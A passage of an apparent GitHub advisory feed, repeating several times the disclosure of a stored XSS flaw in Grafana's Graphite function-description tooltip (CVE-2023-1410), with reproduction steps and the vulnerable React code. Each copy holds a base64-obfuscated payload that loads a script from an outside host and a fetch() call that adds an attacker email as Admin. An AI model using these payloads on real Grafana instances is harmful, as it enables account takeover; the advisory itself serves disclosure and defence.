  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"name\":\"\",\"email\":\"\",\"role\":\"Admin\",\"sendEmail\":true,\"loginOrEmail\":\"hacker@hacker.com\"}",
  "method": "POST",
  "credentials": "include"
});
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The vulnerability seems to occur in the following file: public\app\plugins\datasource\graphite\components\FunctionEditorControls.tsx</p>
<pre><code class="language-typescript">const FunctionDescription = React.lazy(async () =&gt; {
  // @ts-ignore
  const { default: rst2html } = await import(/* webpackChunkName: "rst2html" */ 'rst2html');
  return {
    default(props: { description?: string }) {
      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;
    },
  };
});
</code></pre>
<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>
<li><a href="https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>
<li><a href="https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>
<li><a href="https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T20:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip]]></title>
        <id>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</id>
        <link href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76"/>
        <updated>2023-03-23T20:10:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>
<h3 id="details">Details</h3>
<ol>
<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>
<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>
<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>
</ol>
<p>The result would look like this:</p>
<pre><code class="language-python">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """                                                                              
                                                                                              
  "&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;
                                                                           
  """                  
  if len(seriesListFirstPos) != len(seriesListSecondPos):   
    raise InputParameterError(             
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []                                          
                                    
  for i in range(0, len(seriesListFirstPos)):        
    firstSeries = seriesListFirstPos[i]                                           
    secondSeries = seriesListSecondPos[i]         
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) 
    if not aggregated: # empty list, no data found                          
      continue                   
    result = aggregated[0]  # aggregate() can only return len 1 list           
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)                                                                           
  return results                                                         
                                                                                                                   
                                                                                                       
aggregateSeriesLists.group = 'Combine'                                                             
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),                                                       
  Param('xFilesFactor', ParamTypes.float),                                
]                                                                                                
</code></pre>
<ol start="4">
<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>
<li>Now login to your Grafana instance as an Organisation Admin.</li>
<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>
<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>
<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>
<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>
</ol>
<h3 id="result">Result</h3>
<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>
<h4 id="decoded-payload">Decoded payload</h4>
<pre><code class="language-javascript">var a=document.createElement("script");a.src="https://cm2.tel";document.body.appendChild(a);
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png"></p>
<h3 id="impact">Impact</h3>
<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>
<p>An example would be something like this:</p>
<pre><code class="language-javascript">fetch("/api/org/invites", {
  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"name\":\"\",\"email\":\"\",\"role\":\"Admin\",\"sendEmail\":true,\"loginOrEmail\":\"hacker@hacker.com\"}",
  "method": "POST",
  "credentials": "include"
});
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The vulnerability seems to occur in the following file: public\app\plugins\datasource\graphite\components\FunctionEditorControls.tsx</p>
<pre><code class="language-typescript">const FunctionDescription = React.lazy(async () =&gt; {
  // @ts-ignore
  const { default: rst2html } = await import(/* webpackChunkName: "rst2html" */ 'rst2html');
  return {
    default(props: { description?: string }) {
      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;
    },
  };
});
</code></pre>
<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>
<li><a href="https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>
<li><a href="https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>
<li><a href="https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T20:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip]]></title>
        <id>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</id>
        <link href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76"/>
        <updated>2023-03-23T20:10:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>
<h3 id="details">Details</h3>
<ol>
<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>
<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>
<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>
</ol>
<p>The result would look like this:</p>
<pre><code class="language-python">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """                                                                              
                                                                                              
  "&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;
                                                                           
  """                  
  if len(seriesListFirstPos) != len(seriesListSecondPos):   
    raise InputParameterError(             
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []                                          
                                    
  for i in range(0, len(seriesListFirstPos)):        
    firstSeries = seriesListFirstPos[i]                                           
    secondSeries = seriesListSecondPos[i]         
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) 
    if not aggregated: # empty list, no data found                          
      continue                   
    result = aggregated[0]  # aggregate() can only return len 1 list           
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)                                                                           
  return results                                                         
                                                                                                                   
                                                                                                       
aggregateSeriesLists.group = 'Combine'                                                             
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),                                                       
  Param('xFilesFactor', ParamTypes.float),                                
]                                                                                                
</code></pre>
<ol start="4">
<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>
<li>Now login to your Grafana instance as an Organisation Admin.</li>
<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>
<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>
<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>
<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>
</ol>
<h3 id="result">Result</h3>
<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>
<h4 id="decoded-payload">Decoded payload</h4>
<pre><code class="language-javascript">var a=document.createElement("script");a.src="https://cm2.tel";document.body.appendChild(a);
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png"></p>
<h3 id="impact">Impact</h3>
<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>
<p>An example would be something like this:</p>
<pre><code class="language-javascript">fetch("/api/org/invites", {
  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"name\":\"\",\"email\":\"\",\"role\":\"Admin\",\"sendEmail\":true,\"loginOrEmail\":\"hacker@hacker.com\"}",
  "method": "POST",
  "credentials": "include"
});
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The vulnerability seems to occur in the following file: public\app\plugins\datasource\graphite\components\FunctionEditorControls.tsx</p>
<pre><code class="language-typescript">const FunctionDescription = React.lazy(async () =&gt; {
  // @ts-ignore
  const { default: rst2html } = await import(/* webpackChunkName: "rst2html" */ 'rst2html');
  return {
    default(props: { description?: string }) {
      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;
    },
  };
});
</code></pre>
<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>
<li><a href="https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>
<li><a href="https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>
<li><a href="https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T20:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana Stored Cross-site Scripting in Graphite FunctionDescription tooltip]]></title>
        <id>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</id>
        <link href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76"/>
        <updated>2023-03-23T20:10:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a Graphite data source is added, one can use this data source in a dashboard. This contains a feature to use <code>Functions</code>. Once a function is selected, a small tooltip will be shown when hovering over the name of the function. This tooltip will allow you to delete the selected Function from your query or show the Function Description. However, no sanitization is done when adding this description to the DOM. Since it is not uncommon to connect to public data sources, and attacker could host a Graphite instance with modified Function Descriptions containing XSS payloads. When the victim uses it in a query and accidentally hovers over the Function Description, an attacker controlled XSS payload will be executed. This can be used to add the attacker as an Admin for example. </p>
<h3 id="details">Details</h3>
<ol>
<li>Spin up your own Graphite instance. I've done this using the <code>make devenv sources=graphite</code>.</li>
<li>Now start a terminal for your Graphite container and modify the following file <code>/opt/graphite/webapp/graphite/render/functions.py</code> </li>
<li>Basically you can pick any function but I picked the <code>aggregateSeriesLists</code> function. Modify its description to be <code>"&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;</code></li>
</ol>
<p>The result would look like this:</p>
<pre><code class="language-python">def aggregateSeriesLists(requestContext, seriesListFirstPos, seriesListSecondPos, func, xFilesFactor=None):
  """                                                                              
                                                                                              
  "&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vY20yLnRlbCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))&gt;
                                                                           
  """                  
  if len(seriesListFirstPos) != len(seriesListSecondPos):   
    raise InputParameterError(             
      "seriesListFirstPos and seriesListSecondPos argument must have equal length")
  results = []                                          
                                    
  for i in range(0, len(seriesListFirstPos)):        
    firstSeries = seriesListFirstPos[i]                                           
    secondSeries = seriesListSecondPos[i]         
    aggregated = aggregate(requestContext, (firstSeries, secondSeries), func, xFilesFactor=xFilesFactor) 
    if not aggregated: # empty list, no data found                          
      continue                   
    result = aggregated[0]  # aggregate() can only return len 1 list           
    result.name = result.name[:result.name.find('Series(')] + 'Series(%s,%s)' % (firstSeries.name, secondSeries.name)
    results.append(result)                                                                           
  return results                                                         
                                                                                                                   
                                                                                                       
aggregateSeriesLists.group = 'Combine'                                                             
aggregateSeriesLists.params = [
  Param('seriesListFirstPos', ParamTypes.seriesList, required=True),
  Param('seriesListSecondPos', ParamTypes.seriesList, required=True),
  Param('func', ParamTypes.aggFunc, required=True),                                                       
  Param('xFilesFactor', ParamTypes.float),                                
]                                                                                                
</code></pre>
<ol start="4">
<li>Save and quit the file. Restart your Graphite Container (I did this using the Restart Icon in Docker Desktop)</li>
<li>Now login to your Grafana instance as an Organisation Admin.</li>
<li>Navigate to http://[grafana]/plugins/graphite and click <code>Create a Graphite data source</code></li>
<li>Add the url to the attackers Graphite instance (maybe enable <code>Skip TLS Verify</code>) and click <code>Save &amp; test</code> and <code>Explore</code></li>
<li>In the newly opened page click the + icon next to <code>Functions</code> and search for <code>aggregateSeriesLists</code> and click it to add it.</li>
<li>Now hover over <code>aggregateSeriesLists</code> with your mouse and move your mouse to the <code>?</code> icon.</li>
</ol>
<h3 id="result">Result</h3>
<p>Our payload will trigger and in this case it will include an external script to trigger the alerts.</p>
<h4 id="decoded-payload">Decoded payload</h4>
<pre><code class="language-javascript">var a=document.createElement("script");a.src="https://cm2.tel";document.body.appendChild(a);
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/26874824/225035735-5d00e5d9-3302-4257-8f95-dd562e752893.png"></p>
<h3 id="impact">Impact</h3>
<p>In the POC we've picked 1 function to have a XSS payload, but a real attacker would of course maximize the likelihood by replacing all of it's descriptions with XSS payloads. As shown above the attacker can now run arbitrary javascript in the browser of the victim. The victim can be any user using the malicious Graphite instance in a query (or while Exploring), including the Organisation Admin. If so, an attacker could include a payload to add them as an admin themselves.</p>
<p>An example would be something like this:</p>
<pre><code class="language-javascript">fetch("/api/org/invites", {
  "headers": {
    "content-type": "application/json"
  },
  "body": "{\"name\":\"\",\"email\":\"\",\"role\":\"Admin\",\"sendEmail\":true,\"loginOrEmail\":\"hacker@hacker.com\"}",
  "method": "POST",
  "credentials": "include"
});
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The vulnerability seems to occur in the following file: public\app\plugins\datasource\graphite\components\FunctionEditorControls.tsx</p>
<pre><code class="language-typescript">const FunctionDescription = React.lazy(async () =&gt; {
  // @ts-ignore
  const { default: rst2html } = await import(/* webpackChunkName: "rst2html" */ 'rst2html');
  return {
    default(props: { description?: string }) {
      return &lt;div dangerouslySetInnerHTML={{ __html: rst2html(props.description ?? '') }} /&gt;;
    },
  };
});
</code></pre>
<p>In many other similar cases, some form of sanitization is used. I would advise to use the same here as rst2html itself will just leave HTML untouched when parsing the expected reStructuredText from Graphite. So now when it is applied using dangerouslySetInnerHTML our XSS payload will survive.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc">https://github.com/grafana/grafana/commit/42911348a76e8484396b951bef8b7bff97a84cbc</a></li>
<li><a href="https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6">https://github.com/grafana/grafana/commit/e59427c0747ae2f3feb1bfc3a4b87f0886208cc6</a></li>
<li><a href="https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a">https://github.com/grafana/grafana/commit/ef2eb2b6bf1d7c0fb781e3e05d0d1aecd6dd438a</a></li>
<li><a href="https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a">https://github.com/grafana/grafana/commit/f9548d33f8624d6694983fe5aad181007405be8a</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/advisories/GHSA-qrrg-gw7w-vp76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qrrg-gw7w-vp76</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T20:10:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</id>
        <link href="https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"/>
        <updated>2023-03-27T22:32:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of <a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-3cgw-hfw7-wc7j">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T09:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/grafana/grafana] Duplicate Advisory: Grafana Stored Cross-site Scripting vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</id>
        <link href="https://github.com/advisories/GHSA-3cgw-hfw7-wc7j"/>
        <updated>2023-03-27T22:32:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of <a href="https://github.com/advisories/GHSA-qrrg-gw7w-vp76">GHSA-qrrg-gw7w-vp76</a>. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>Grafana is an open-source platform for monitoring and observability. Grafana had a stored XSS vulnerability in the Graphite FunctionDescription tooltip. The stored XSS vulnerability was possible due the value of the Function Description was not properly sanitized. An attacker needs to have control over the Graphite data source in order to manipulate a function description and a Grafana admin needs to configure the data source, later a Grafana user needs to select a tampered function and hover over the description. Users may upgrade to version 8.5.22, 9.2.15 and 9.3.11 to receive a fix.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76">https://github.com/grafana/bugbounty/security/advisories/GHSA-qrrg-gw7w-vp76</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1410">https://nvd.nist.gov/vuln/detail/CVE-2023-1410</a></li>
<li><a href="https://grafana.com/security/security-advisories/cve-2023-1410/">https://grafana.com/security/security-advisories/cve-2023-1410/</a></li>
<li><a href="https://github.com/advisories/GHSA-3cgw-hfw7-wc7j">https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3cgw-hfw7-wc7j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-03-23T09:30:25.000Z</published>
    </entry>
</feed>